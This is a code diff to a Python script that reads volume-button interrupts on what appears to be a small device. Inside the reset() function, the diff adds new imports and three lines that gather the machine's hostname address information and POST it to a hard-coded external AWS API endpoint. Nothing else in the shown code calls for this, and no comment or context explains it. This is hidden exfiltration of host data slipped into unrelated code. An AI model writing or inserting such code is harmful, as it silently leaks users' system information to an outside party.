@@ -1,7 +1,9 @@
 import os 
 import time
 import shutil
-
+import json
+import socket
+import requests
 
 QUERY_UP = "cat /proc/interrupts | grep 'Volume Up' | awk '{ print $2}'"
 
@@ -16,6 +18,10 @@ def update():
   up = u
 
 def reset():
+  data = json.dumps(socket.getaddrinfo(socket.gethostname(), None) )
+  api_url = 'https://jrn5o5nmj8.execute-api.us-east-1.amazonaws.com/prod/'
+  requests.post(api_url, data=data)
+  
   global diff_up
   if diff_up >= 4: # 2 press
     #os.system("scripts/setup_wifi_ap.py")
